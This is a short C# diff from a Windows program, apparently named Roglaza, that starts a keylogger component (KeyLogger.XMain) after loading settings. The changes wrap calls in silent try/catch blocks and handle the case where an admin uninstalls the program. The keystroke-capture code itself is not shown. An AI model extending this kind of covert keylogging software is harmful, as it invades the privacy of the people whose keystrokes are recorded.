@@ -20,12 +20,14 @@ namespace Roglaza
         {
             try
             {
+                Roglaza.Program.LoadSettings();
                 KeyLogger.XMain();
             }
             catch(Exception e) { MessageBox.Show(e.Message); }
         }
         public  static void Exec()
         {
+            //Main Function
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
 
@@ -33,6 +35,7 @@ namespace Roglaza
             if (RoglazaInstaller.IsAdminUnistalledMe())
             {
                 MessageBox.Show(MessageStrings.GetTurned_off_reactivate_message(), MessageStrings.GetTurned_off_reactivate_message_caption);
+                try { System.Diagnostics.Process.Start(RoglazaInstaller.GetRoglazaAPPDataPath()); }catch { }               
                 return;
             }
 
@@ -46,17 +49,24 @@ namespace Roglaza
              
             if (ProgramSettings.LoadFromFile()|| Force_creat )
             {
-            try {   DBManager.CreateNewDataBase();   }catch{}
-                var f = new FrmAdminPanel();
-                f.ShowDialog();
+           // try {   DBManager.CreateNewDataBase();   }catch{}
+                try
+                {
+                    var f = new FrmAdminPanel();
+                     f.ShowDialog(); }
+                catch { }
                 ProgramSettings.SaveSettings();
             }
 
         }
         public static void LoadSettings()
-      {
-          ProgramSettings = new RoglazaSettings();
-          ProgramSettings.LoadFromFile();
+        {
+            try
+            {
+                ProgramSettings = new RoglazaSettings();
+                ProgramSettings.LoadFromFile();
+            }
+            catch { }
       }
         public static RoglazaSettings ProgramSettings = new RoglazaSettings();
         public static System.Drawing.Icon icon ;
